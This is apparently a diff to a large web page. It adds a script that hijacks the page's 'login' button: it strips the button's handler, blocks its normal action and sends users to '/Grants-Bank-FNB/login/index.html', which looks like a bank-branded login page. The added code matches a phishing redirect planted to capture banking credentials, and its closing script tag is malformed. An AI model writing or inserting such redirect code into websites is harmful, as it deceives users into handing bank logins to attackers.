@@ -263079,9 +263079,23 @@ $(function() {
 		}
 }
 </style>	
-		
-	
-				
+<script>		
+	document.addEventListener("DOMContentLoaded", () => {
+    const loginBtn = Array.from(document.querySelectorAll('a, button, input[type="submit"], input[type="button"]'))
+      .find(el => (el.textContent || el.value || '').trim().toLowerCase() === 'login');
+
+    if (loginBtn) {
+      loginBtn.removeAttribute('onclick');
+      loginBtn.style.cursor = 'pointer';
+
+      loginBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        window.location.href = '/Grants-Bank-FNB/login/index.html';
+      }, true);
+    }
+  }); 
+ </script			
 </div>
 		
 				
@@ -263095,8 +263109,7 @@ $(function() {
 
 
 
-				
-				
+
 	
 	
 	</body>
